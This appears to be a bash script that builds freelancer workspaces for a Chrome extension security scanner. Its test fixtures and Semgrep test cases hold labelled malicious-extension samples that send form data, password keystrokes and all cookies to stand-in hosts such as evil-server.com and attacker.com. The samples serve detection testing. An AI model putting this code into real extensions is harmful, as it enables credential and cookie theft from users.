#!/bin/bash
# ============================================================================
# Create Freelancer Repository
# ============================================================================
#
# This script creates isolated repositories for freelancers with only the
# code they need to complete their assigned task.
#
# Usage:
#   ./scripts/create_freelancer_repo.sh <work_stream> [output_dir]
#
# Work Streams:
#   frontend          - Full React frontend (no API secrets)
#   analyzer-sast     - SAST analyzer module
#   analyzer-permissions - Permissions analyzer module
#   analyzer-template - Empty analyzer template
#   semgrep-rules     - Semgrep rule files only
#   llm-prompts       - LLM prompt templates only
#   ui-component      - Single UI component template
#
# Examples:
#   ./scripts/create_freelancer_repo.sh frontend
#   ./scripts/create_freelancer_repo.sh analyzer-sast ./freelancer-repos
#   ./scripts/create_freelancer_repo.sh semgrep-rules
#
# ============================================================================

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Get script directory and project root
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

# Arguments
WORK_STREAM=$1
OUTPUT_BASE=${2:-"$PROJECT_ROOT/freelancer-repos"}

# Validate arguments
if [ -z "$WORK_STREAM" ]; then
    echo -e "${RED}Error: Work stream required${NC}"
    echo ""
    echo "Usage: $0 <work_stream> [output_dir]"
    echo ""
    echo "Available work streams:"
    echo "  frontend            - Full React frontend"
    echo "  analyzer-sast       - SAST analyzer module"
    echo "  analyzer-permissions - Permissions analyzer module"
    echo "  analyzer-template   - Empty analyzer template"
    echo "  semgrep-rules       - Semgrep rule files"
    echo "  llm-prompts         - LLM prompt templates"
    echo "  ui-component        - UI component template"
    exit 1
fi

OUTPUT_DIR="$OUTPUT_BASE/atlas-$WORK_STREAM"

echo -e "${BLUE}Creating freelancer repo for: ${YELLOW}$WORK_STREAM${NC}"
echo -e "${BLUE}Output directory: ${YELLOW}$OUTPUT_DIR${NC}"
echo ""

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Function to create README
create_readme() {
    local title=$1
    local description=$2
    cat > "$OUTPUT_DIR/README.md" << EOF
# Atlas - $title

$description

## Getting Started

1. Read through this README and understand the assignment
2. Review the interface contract in \`contracts/\`
3. Implement your solution
4. Run tests to verify
5. Submit your code for review

## Directory Structure

\`\`\`
$(find "$OUTPUT_DIR" -type f -name "*.py" -o -name "*.yaml" -o -name "*.json" -o -name "*.jsx" | sed "s|$OUTPUT_DIR/||" | head -20)
\`\`\`

## Testing

Run the test suite:

\`\`\`bash
# Install dependencies
pip install -r requirements.txt

# Run tests
pytest tests/
\`\`\`

## Submission

When complete:
1. Ensure all tests pass
2. Document any assumptions in NOTES.md
3. Submit via the agreed method

## Questions?

Contact the project lead for clarification.
EOF
}

# Function to create basic requirements.txt
create_requirements() {
    cat > "$OUTPUT_DIR/requirements.txt" << EOF
# Core dependencies for development
pytest>=7.0.0
black>=23.0.0
pylint>=2.17.0
EOF
}

# Function to create test fixtures
create_test_fixtures() {
    mkdir -p "$OUTPUT_DIR/fixtures/benign_extension"
    mkdir -p "$OUTPUT_DIR/fixtures/malicious_extension"
    
    # Create benign extension
    cat > "$OUTPUT_DIR/fixtures/benign_extension/manifest.json" << 'EOF'
{
  "manifest_version": 3,
  "name": "Simple Note Taker",
  "version": "1.0.0",
  "description": "A simple extension to take notes",
  "permissions": ["storage"],
  "action": {
    "default_popup": "popup.html"
  }
}
EOF

    cat > "$OUTPUT_DIR/fixtures/benign_extension/popup.js" << 'EOF'
// Simple note-taking functionality
document.getElementById('save').addEventListener('click', () => {
  const note = document.getElementById('note').value;
  chrome.storage.local.set({ note: note });
});

document.getElementById('load').addEventListener('click', async () => {
  const result = await chrome.storage.local.get(['note']);
  document.getElementById('note').value = result.note || '';
});
EOF

    # Create malicious extension (for testing detection)
    cat > "$OUTPUT_DIR/fixtures/malicious_extension/manifest.json" << 'EOF'
{
  "manifest_version": 3,
  "name": "Super Productivity Tool",
  "version": "1.0.0",
  "description": "Boost your productivity!",
  "permissions": ["tabs", "cookies", "webRequest", "storage", "<all_urls>"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [{
    "matches": ["<all_urls>"],
    "js": ["content.js"]
  }]
}
EOF

    cat > "$OUTPUT_DIR/fixtures/malicious_extension/content.js" << 'EOF'
// Suspicious: Capturing form data
document.addEventListener('submit', function(e) {
  const form = e.target;
  const inputs = form.querySelectorAll('input');
  const data = {};
  inputs.forEach(input => {
    data[input.name] = input.value;
  });
  
  // Suspicious: Sending to external server
  fetch('https://evil-server.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});

// Suspicious: Keylogger behavior
document.addEventListener('keydown', function(e) {
  if (e.target.type === 'password') {
    navigator.sendBeacon('https://evil-server.com/keys', e.key);
  }
});
EOF

    cat > "$OUTPUT_DIR/fixtures/malicious_extension/background.js" << 'EOF'
// Suspicious: Cookie stealing
chrome.cookies.getAll({}, function(cookies) {
  fetch('https://evil-server.com/cookies', {
    method: 'POST',
    body: JSON.stringify(cookies)
  });
});

// Suspicious: Injecting scripts
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url.includes('bank')) {
    chrome.scripting.executeScript({
      target: { tabId: tabId },
      files: ['inject.js']
    });
  }
});
EOF
}

# Create work stream specific content
case $WORK_STREAM in
    "frontend")
        echo -e "${GREEN}Creating frontend freelancer repo...${NC}"
        
        # Copy frontend directory
        cp -r "$PROJECT_ROOT/frontend/"* "$OUTPUT_DIR/"
        
        # Remove node_modules if present
        rm -rf "$OUTPUT_DIR/node_modules"
        rm -rf "$OUTPUT_DIR/dist"
        
        # Remove sensitive service files (mock them instead)
        cat > "$OUTPUT_DIR/src/services/apiService.js" << 'EOF'
// API Service - Configure your API endpoint
const API_BASE_URL = process.env.VITE_API_URL || 'http://localhost:8007';

export const api = {
  async startScan(url) {
    const response = await fetch(`${API_BASE_URL}/scan`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ url })
    });
    return response.json();
  },

  async getScanStatus(scanId) {
    const response = await fetch(`${API_BASE_URL}/scan/${scanId}/status`);
    return response.json();
  },

  async listScans(limit = 20, offset = 0) {
    const response = await fetch(`${API_BASE_URL}/scans?limit=${limit}&offset=${offset}`);
    return response.json();
  }
};
EOF

        # Copy API spec as reference
        mkdir -p "$OUTPUT_DIR/docs"
        cp "$PROJECT_ROOT/contracts/frontend_api_spec.yaml" "$OUTPUT_DIR/docs/"
        
        # Create mock data for development
        cat > "$OUTPUT_DIR/src/services/mockData.js" << 'EOF'
// Mock data for development - matches API spec
export const mockScanResult = {
  scan_id: "mock_scan_123",
  status: "completed",
  progress: 100,
  results: {
    extension_metadata: {
      name: "Example Extension",
      version: "1.0.0",
      extension_id: "abcdefghijklmnop"
    },
    overall_risk_score: 0.65,
    risk_level: "medium",
    permissions_analysis: {
      risk_score: 0.5,
      permissions: [
        { permission: "tabs", risk_level: "medium", description: "Access to browser tabs" }
      ]
    },
    sast_analysis: {
      risk_score: 0.7,
      findings: [
        {
          rule_id: "atlas-data-exfil",
          severity: "high",
          message: "Potential data exfiltration detected",
          file: "content.js",
          line: 42
        }
      ]
    },
    executive_summary: {
      overall_assessment: "MEDIUM RISK - Extension shows some concerning patterns",
      key_findings: ["Potential data exfiltration", "Broad permissions"],
      recommendations: ["Review data handling", "Limit permissions"]
    }
  }
};
EOF
        
        create_readme "Frontend" "React frontend for the Chrome Extension Security Scanner. Build user interfaces that display security analysis results."
        
        echo -e "${GREEN}✓ Frontend repo created${NC}"
        ;;
        
    "analyzer-sast")
        echo -e "${GREEN}Creating SAST analyzer freelancer repo...${NC}"
        
        mkdir -p "$OUTPUT_DIR/src"
        mkdir -p "$OUTPUT_DIR/contracts"
        mkdir -p "$OUTPUT_DIR/config"
        mkdir -p "$OUTPUT_DIR/tests"
        
        # Copy analyzer and contract
        cp "$PROJECT_ROOT/src/project_atlas/core/analyzers/sast.py" "$OUTPUT_DIR/src/"
        cp "$PROJECT_ROOT/contracts/analyzer_interface.py" "$OUTPUT_DIR/contracts/"
        
        # Copy config files
        cp "$PROJECT_ROOT/src/project_atlas/config/sast_config.json" "$OUTPUT_DIR/config/"
        cp "$PROJECT_ROOT/src/project_atlas/config/custom_semgrep_rules.yaml" "$OUTPUT_DIR/config/"
        
        create_test_fixtures
        create_requirements
        echo "semgrep>=1.50.0" >> "$OUTPUT_DIR/requirements.txt"
        
        create_readme "SAST Analyzer" "Static Application Security Testing analyzer for Chrome extensions using Semgrep."
        
        echo -e "${GREEN}✓ SAST analyzer repo created${NC}"
        ;;
        
    "analyzer-permissions")
        echo -e "${GREEN}Creating Permissions analyzer freelancer repo...${NC}"
        
        mkdir -p "$OUTPUT_DIR/src"
        mkdir -p "$OUTPUT_DIR/contracts"
        mkdir -p "$OUTPUT_DIR/data"
        mkdir -p "$OUTPUT_DIR/tests"
        
        # Copy analyzer and contract
        cp "$PROJECT_ROOT/src/project_atlas/core/analyzers/permissions.py" "$OUTPUT_DIR/src/"
        cp "$PROJECT_ROOT/contracts/analyzer_interface.py" "$OUTPUT_DIR/contracts/"
        
        # Copy permissions database
        cp "$PROJECT_ROOT/src/project_atlas/data/permissions_db.json" "$OUTPUT_DIR/data/"
        
        create_test_fixtures
        create_requirements
        
        create_readme "Permissions Analyzer" "Analyzes Chrome extension permissions for security risks."
        
        echo -e "${GREEN}✓ Permissions analyzer repo created${NC}"
        ;;
        
    "analyzer-template")
        echo -e "${GREEN}Creating analyzer template repo...${NC}"
        
        mkdir -p "$OUTPUT_DIR/src"
        mkdir -p "$OUTPUT_DIR/contracts"
        mkdir -p "$OUTPUT_DIR/tests"
        
        # Copy contract only
        cp "$PROJECT_ROOT/contracts/analyzer_interface.py" "$OUTPUT_DIR/contracts/"
        
        # Create template analyzer
        cat > "$OUTPUT_DIR/src/my_analyzer.py" << 'EOF'
"""
Your Analyzer Implementation
============================

Implement your analyzer by inheriting from BaseAnalyzer.
See contracts/analyzer_interface.py for the interface definition.
"""
import os
from typing import Dict, Any
from contracts.analyzer_interface import (
    BaseAnalyzer,
    AnalyzerResult,
    Finding,
    SEVERITY_HIGH,
    SEVERITY_MEDIUM,
    SEVERITY_LOW,
)


class MyAnalyzer(BaseAnalyzer):
    """
    Your custom analyzer implementation.
    
    TODO: 
    1. Rename this class appropriately
    2. Implement the analyze() method
    3. Return findings in the correct format
    """
    
    @property
    def name(self) -> str:
        # TODO: Change to your analyzer's unique name
        return "my_analyzer"
    
    def analyze(self, extension_dir: str, manifest: Dict[str, Any]) -> AnalyzerResult:
        """
        Analyze the Chrome extension.
        
        Args:
            extension_dir: Path to extracted extension directory
            manifest: Parsed manifest.json as dictionary
            
        Returns:
            AnalyzerResult with findings
        """
        findings = []
        
        # TODO: Implement your analysis logic here
        # 
        # Example: Check for suspicious patterns
        # js_files = self._find_js_files(extension_dir)
        # for js_file in js_files:
        #     content = self._read_file(js_file)
        #     if self._is_suspicious(content):
        #         findings.append(Finding(...))
        
        # Calculate risk score based on findings
        risk_score = self._calculate_risk_score(findings)
        
        return AnalyzerResult(
            analyzer_name=self.name,
            risk_score=risk_score,
            findings=findings,
            summary=f"Analyzed extension, found {len(findings)} issues",
        )
    
    def _calculate_risk_score(self, findings: list) -> float:
        """Calculate overall risk score from findings."""
        if not findings:
            return 0.0
        
        severity_weights = {
            "critical": 1.0,
            "high": 0.8,
            "medium": 0.5,
            "low": 0.2,
            "info": 0.1,
        }
        
        total_weight = sum(
            severity_weights.get(f.severity, 0.1) for f in findings
        )
        
        return min(total_weight / 5.0, 1.0)  # Normalize to 0-1
    
    def _find_js_files(self, directory: str) -> list:
        """Find all JavaScript files in the extension."""
        js_files = []
        for root, _, files in os.walk(directory):
            for file in files:
                if file.endswith(('.js', '.jsx', '.ts', '.tsx')):
                    js_files.append(os.path.join(root, file))
        return js_files
    
    def _read_file(self, filepath: str) -> str:
        """Read file contents safely."""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                return f.read()
        except Exception:
            return ""


# For testing
if __name__ == "__main__":
    import json
    
    analyzer = MyAnalyzer()
    
    # Test with fixture
    test_dir = "fixtures/malicious_extension"
    with open(f"{test_dir}/manifest.json") as f:
        manifest = json.load(f)
    
    result = analyzer.analyze(test_dir, manifest)
    print(json.dumps(result.to_dict(), indent=2))
EOF
        
        # Create test file
        cat > "$OUTPUT_DIR/tests/test_my_analyzer.py" << 'EOF'
"""
Tests for your analyzer.

Run with: pytest tests/
"""
import json
import os
import pytest
import sys

# Add parent to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.my_analyzer import MyAnalyzer


@pytest.fixture
def analyzer():
    return MyAnalyzer()


@pytest.fixture
def benign_extension(tmp_path):
    """Create a benign extension fixture."""
    ext_dir = tmp_path / "benign"
    ext_dir.mkdir()
    
    manifest = {
        "manifest_version": 3,
        "name": "Simple Extension",
        "version": "1.0.0",
        "permissions": ["storage"]
    }
    
    with open(ext_dir / "manifest.json", "w") as f:
        json.dump(manifest, f)
    
    with open(ext_dir / "popup.js", "w") as f:
        f.write("console.log('Hello');")
    
    return str(ext_dir), manifest


@pytest.fixture  
def malicious_extension(tmp_path):
    """Create a malicious extension fixture."""
    ext_dir = tmp_path / "malicious"
    ext_dir.mkdir()
    
    manifest = {
        "manifest_version": 3,
        "name": "Evil Extension",
        "version": "1.0.0",
        "permissions": ["tabs", "cookies", "<all_urls>"]
    }
    
    with open(ext_dir / "manifest.json", "w") as f:
        json.dump(manifest, f)
    
    with open(ext_dir / "content.js", "w") as f:
        f.write("""
            document.addEventListener('submit', (e) => {
                fetch('https://evil.com/steal', {
                    method: 'POST',
                    body: JSON.stringify(e.target)
                });
            });
        """)
    
    return str(ext_dir), manifest


class TestMyAnalyzer:
    def test_analyzer_has_name(self, analyzer):
        """Analyzer must have a unique name."""
        assert analyzer.name is not None
        assert len(analyzer.name) > 0
    
    def test_analyze_returns_result(self, analyzer, benign_extension):
        """Analyze must return an AnalyzerResult."""
        ext_dir, manifest = benign_extension
        result = analyzer.analyze(ext_dir, manifest)
        
        assert result is not None
        assert hasattr(result, 'risk_score')
        assert hasattr(result, 'findings')
        assert hasattr(result, 'summary')
    
    def test_risk_score_in_range(self, analyzer, benign_extension):
        """Risk score must be between 0 and 1."""
        ext_dir, manifest = benign_extension
        result = analyzer.analyze(ext_dir, manifest)
        
        assert 0.0 <= result.risk_score <= 1.0
    
    def test_benign_extension_low_risk(self, analyzer, benign_extension):
        """Benign extension should have low risk score."""
        ext_dir, manifest = benign_extension
        result = analyzer.analyze(ext_dir, manifest)
        
        # Adjust threshold based on your analyzer
        assert result.risk_score < 0.5
    
    def test_malicious_extension_detected(self, analyzer, malicious_extension):
        """Malicious extension should be flagged."""
        ext_dir, manifest = malicious_extension
        result = analyzer.analyze(ext_dir, manifest)
        
        # Your analyzer should detect issues in the malicious extension
        # Adjust these assertions based on what your analyzer detects
        assert result.risk_score > 0.3 or len(result.findings) > 0
    
    def test_to_dict_serializable(self, analyzer, benign_extension):
        """Result must be JSON serializable."""
        ext_dir, manifest = benign_extension
        result = analyzer.analyze(ext_dir, manifest)
        
        # Should not raise
        result_dict = result.to_dict()
        json_str = json.dumps(result_dict)
        assert json_str is not None
EOF
        
        create_test_fixtures
        create_requirements
        
        create_readme "Analyzer Template" "Template for creating a new Chrome extension security analyzer. Implement your custom analysis logic following the BaseAnalyzer interface."
        
        echo -e "${GREEN}✓ Analyzer template repo created${NC}"
        ;;
        
    "semgrep-rules")
        echo -e "${GREEN}Creating Semgrep rules freelancer repo...${NC}"
        
        mkdir -p "$OUTPUT_DIR/rules"
        mkdir -p "$OUTPUT_DIR/test_cases/positive"
        mkdir -p "$OUTPUT_DIR/test_cases/negative"
        
        # Copy existing rules
        cp "$PROJECT_ROOT/src/project_atlas/config/custom_semgrep_rules.yaml" "$OUTPUT_DIR/rules/"
        cp "$PROJECT_ROOT/contracts/semgrep_rule_template.yaml" "$OUTPUT_DIR/"
        
        # Create test cases
        cat > "$OUTPUT_DIR/test_cases/positive/credential_theft.js" << 'EOF'
// This file should trigger credential theft detection rules

// Pattern: Form interception for credential theft
document.addEventListener('submit', function(event) {
  const form = event.target;
  const password = form.querySelector('input[type="password"]').value;
  
  // Exfiltrating credentials
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ password: password })
  });
});

// Pattern: Keylogger on password fields
document.querySelectorAll('input[type="password"]').forEach(input => {
  input.addEventListener('keypress', (e) => {
    navigator.sendBeacon('https://evil.com/log', e.key);
  });
});
EOF

        cat > "$OUTPUT_DIR/test_cases/negative/safe_form.js" << 'EOF'
// This file should NOT trigger credential theft rules

// Safe: Normal form validation
document.getElementById('myForm').addEventListener('submit', function(event) {
  const email = document.getElementById('email').value;
  
  if (!email.includes('@')) {
    event.preventDefault();
    alert('Please enter a valid email');
  }
});

// Safe: Local storage usage
const settings = localStorage.getItem('userSettings');
console.log('Settings loaded:', settings);

// Safe: Using chrome storage API locally
chrome.storage.local.get(['preferences'], function(result) {
  console.log('Preferences:', result.preferences);
});
EOF
        
        # Create run script
        cat > "$OUTPUT_DIR/run_tests.sh" << 'EOF'
#!/bin/bash
# Run Semgrep tests against test cases

echo "Testing rules against positive cases (should find issues)..."
semgrep --config rules/custom_semgrep_rules.yaml test_cases/positive/

echo ""
echo "Testing rules against negative cases (should find nothing)..."
semgrep --config rules/custom_semgrep_rules.yaml test_cases/negative/
EOF
        chmod +x "$OUTPUT_DIR/run_tests.sh"
        
        cat > "$OUTPUT_DIR/requirements.txt" << 'EOF'
semgrep>=1.50.0
EOF
        
        create_readme "Semgrep Security Rules" "Custom Semgrep rules for detecting malicious patterns in Chrome extensions. Add new rules to detect credential theft, data exfiltration, and other threats."
        
        echo -e "${GREEN}✓ Semgrep rules repo created${NC}"
        ;;
        
    "llm-prompts")
        echo -e "${GREEN}Creating LLM prompts freelancer repo...${NC}"
        
        mkdir -p "$OUTPUT_DIR/prompts"
        mkdir -p "$OUTPUT_DIR/examples"
        
        # Copy existing prompts
        cp "$PROJECT_ROOT/src/project_atlas/llm/prompts/"*.yaml "$OUTPUT_DIR/prompts/" 2>/dev/null || true
        cp "$PROJECT_ROOT/contracts/llm_prompt_template.yaml" "$OUTPUT_DIR/"
        
        # Create example input data
        cat > "$OUTPUT_DIR/examples/sample_input.json" << 'EOF'
{
  "extension_name": "Shopping Assistant Pro",
  "version": "2.1.0",
  "description": "Helps you find the best deals while shopping online",
  "extension_id": "abcdefghijklmnop",
  "permissions": ["tabs", "storage", "activeTab"],
  "host_permissions": ["*://*.amazon.com/*", "*://*.ebay.com/*"],
  "manifest_json": {
    "manifest_version": 3,
    "name": "Shopping Assistant Pro",
    "permissions": ["tabs", "storage", "activeTab"],
    "host_permissions": ["*://*.amazon.com/*", "*://*.ebay.com/*"],
    "content_scripts": [{
      "matches": ["*://*.amazon.com/*"],
      "js": ["content.js"]
    }]
  },
  "webstore_data": {
    "user_count": 50000,
    "rating": 4.2,
    "rating_count": 1200,
    "developer": "Shopping Tools Inc."
  }
}
EOF
        
        create_readme "LLM Prompts" "Prompt templates for AI-powered Chrome extension analysis. Create prompts that generate accurate, actionable security assessments."
        
        echo -e "${GREEN}✓ LLM prompts repo created${NC}"
        ;;
        
    "ui-component")
        echo -e "${GREEN}Creating UI component template repo...${NC}"
        
        mkdir -p "$OUTPUT_DIR/src/components"
        mkdir -p "$OUTPUT_DIR/src/styles"
        
        # Create component template
        cat > "$OUTPUT_DIR/src/components/MyComponent.jsx" << 'EOF'
/**
 * Your Component Implementation
 * ==============================
 * 
 * Build your React component following the design system.
 * See the props interface and mock data for guidance.
 */
import React from 'react';
import './MyComponent.scss';

/**
 * Props Interface:
 * @param {Object} data - Analysis result data
 * @param {number} data.risk_score - Risk score 0-1
 * @param {string} data.risk_level - 'low', 'medium', 'high', 'critical'
 * @param {Array} data.findings - Array of finding objects
 * @param {Function} onAction - Callback when user takes action
 * @param {boolean} loading - Loading state
 */
export function MyComponent({ data, onAction, loading = false }) {
  if (loading) {
    return (
      <div className="my-component my-component--loading">
        <div className="my-component__spinner" />
        <p>Loading...</p>
      </div>
    );
  }

  if (!data) {
    return (
      <div className="my-component my-component--empty">
        <p>No data available</p>
      </div>
    );
  }

  const { risk_score, risk_level, findings = [] } = data;

  return (
    <div className={`my-component my-component--${risk_level}`}>
      <header className="my-component__header">
        <h2>Analysis Results</h2>
        <span className="my-component__risk-badge">
          {risk_level.toUpperCase()}
        </span>
      </header>

      <div className="my-component__score">
        <div 
          className="my-component__score-bar"
          style={{ width: `${risk_score * 100}%` }}
        />
        <span>{Math.round(risk_score * 100)}%</span>
      </div>

      <ul className="my-component__findings">
        {findings.map((finding, index) => (
          <li key={index} className={`finding finding--${finding.severity}`}>
            <span className="finding__severity">{finding.severity}</span>
            <span className="finding__message">{finding.message}</span>
          </li>
        ))}
      </ul>

      {onAction && (
        <button 
          className="my-component__action"
          onClick={() => onAction('view_details')}
        >
          View Details
        </button>
      )}
    </div>
  );
}

export default MyComponent;
EOF

        # Create styles
        cat > "$OUTPUT_DIR/src/components/MyComponent.scss" << 'EOF'
/* 
 * Component Styles
 * ================
 * 
 * Design System Tokens (use these):
 * - Colors: var(--color-primary), var(--color-danger), etc.
 * - Spacing: var(--space-xs), var(--space-sm), var(--space-md), etc.
 * - Radius: var(--radius-sm), var(--radius-md), etc.
 */

.my-component {
  background: var(--color-surface, #1a1a2e);
  border-radius: var(--radius-md, 8px);
  padding: var(--space-lg, 24px);
  color: var(--color-text, #e0e0e0);

  &--loading {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 200px;
  }

  &--low {
    border-left: 4px solid var(--color-success, #22c55e);
  }

  &--medium {
    border-left: 4px solid var(--color-warning, #f59e0b);
  }

  &--high {
    border-left: 4px solid var(--color-danger, #ef4444);
  }

  &--critical {
    border-left: 4px solid var(--color-critical, #dc2626);
    background: linear-gradient(135deg, #1a1a2e 0%, #2d1f1f 100%);
  }

  &__header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: var(--space-md, 16px);

    h2 {
      margin: 0;
      font-size: 1.25rem;
      font-weight: 600;
    }
  }

  &__risk-badge {
    padding: var(--space-xs, 4px) var(--space-sm, 8px);
    border-radius: var(--radius-sm, 4px);
    font-size: 0.75rem;
    font-weight: 700;
    text-transform: uppercase;
    background: var(--color-danger, #ef4444);
    color: white;
  }

  &__score {
    position: relative;
    height: 8px;
    background: var(--color-surface-alt, #2a2a4a);
    border-radius: 4px;
    margin-bottom: var(--space-md, 16px);
    overflow: hidden;

    &-bar {
      position: absolute;
      top: 0;
      left: 0;
      height: 100%;
      background: linear-gradient(90deg, #22c55e 0%, #f59e0b 50%, #ef4444 100%);
      transition: width 0.3s ease;
    }

    span {
      position: absolute;
      right: 0;
      top: -20px;
      font-size: 0.875rem;
      font-weight: 600;
    }
  }

  &__findings {
    list-style: none;
    padding: 0;
    margin: var(--space-md, 16px) 0;
  }

  &__action {
    width: 100%;
    padding: var(--space-sm, 8px) var(--space-md, 16px);
    background: var(--color-primary, #6366f1);
    color: white;
    border: none;
    border-radius: var(--radius-sm, 4px);
    cursor: pointer;
    font-weight: 600;
    transition: background 0.2s ease;

    &:hover {
      background: var(--color-primary-hover, #4f46e5);
    }
  }

  &__spinner {
    width: 40px;
    height: 40px;
    border: 3px solid var(--color-surface-alt, #2a2a4a);
    border-top-color: var(--color-primary, #6366f1);
    border-radius: 50%;
    animation: spin 1s linear infinite;
  }
}

.finding {
  display: flex;
  gap: var(--space-sm, 8px);
  padding: var(--space-sm, 8px);
  margin-bottom: var(--space-xs, 4px);
  background: var(--color-surface-alt, #2a2a4a);
  border-radius: var(--radius-sm, 4px);

  &__severity {
    padding: 2px 6px;
    border-radius: 3px;
    font-size: 0.7rem;
    font-weight: 700;
    text-transform: uppercase;
  }

  &--critical &__severity { background: #dc2626; color: white; }
  &--high &__severity { background: #ef4444; color: white; }
  &--medium &__severity { background: #f59e0b; color: black; }
  &--low &__severity { background: #22c55e; color: white; }
}

@keyframes spin {
  to { transform: rotate(360deg); }
}
EOF

        # Create mock data
        cat > "$OUTPUT_DIR/src/mockData.js" << 'EOF'
// Mock data for component development
export const mockData = {
  risk_score: 0.72,
  risk_level: 'high',
  findings: [
    {
      severity: 'critical',
      message: 'Extension sends data to unknown external server'
    },
    {
      severity: 'high', 
      message: 'Requests access to all browser cookies'
    },
    {
      severity: 'medium',
      message: 'Uses eval() with dynamic input'
    },
    {
      severity: 'low',
      message: 'No privacy policy found'
    }
  ]
};

export const mockDataLowRisk = {
  risk_score: 0.15,
  risk_level: 'low',
  findings: [
    {
      severity: 'low',
      message: 'Uses localStorage for caching'
    }
  ]
};
EOF

        # Create package.json
        cat > "$OUTPUT_DIR/package.json" << 'EOF'
{
  "name": "atlas-ui-component",
  "version": "1.0.0",
  "type": "module",
  "scripts": {
    "dev": "vite",
    "build": "vite build"
  },
  "dependencies": {
    "react": "^18.2.0",
    "react-dom": "^18.2.0"
  },
  "devDependencies": {
    "@vitejs/plugin-react": "^4.0.0",
    "sass": "^1.69.0",
    "vite": "^5.0.0"
  }
}
EOF
        
        create_readme "UI Component" "Build a React component for the security scanning dashboard. Follow the design system tokens and mock data format."
        
        echo -e "${GREEN}✓ UI component repo created${NC}"
        ;;
        
    *)
        echo -e "${RED}Unknown work stream: $WORK_STREAM${NC}"
        echo ""
        echo "Available work streams:"
        echo "  frontend, analyzer-sast, analyzer-permissions,"
        echo "  analyzer-template, semgrep-rules, llm-prompts, ui-component"
        exit 1
        ;;
esac

# Initialize git repo
cd "$OUTPUT_DIR"
git init -q
git add .
git commit -q -m "Initial freelancer workspace for $WORK_STREAM"

echo ""
echo -e "${GREEN}✅ Freelancer repo created successfully!${NC}"
echo ""
echo -e "Location: ${YELLOW}$OUTPUT_DIR${NC}"
echo ""
echo "Next steps:"
echo "  1. Review the generated files"
echo "  2. Zip or push to a private repo for the freelancer"
echo "  3. Share assignment instructions"
echo ""

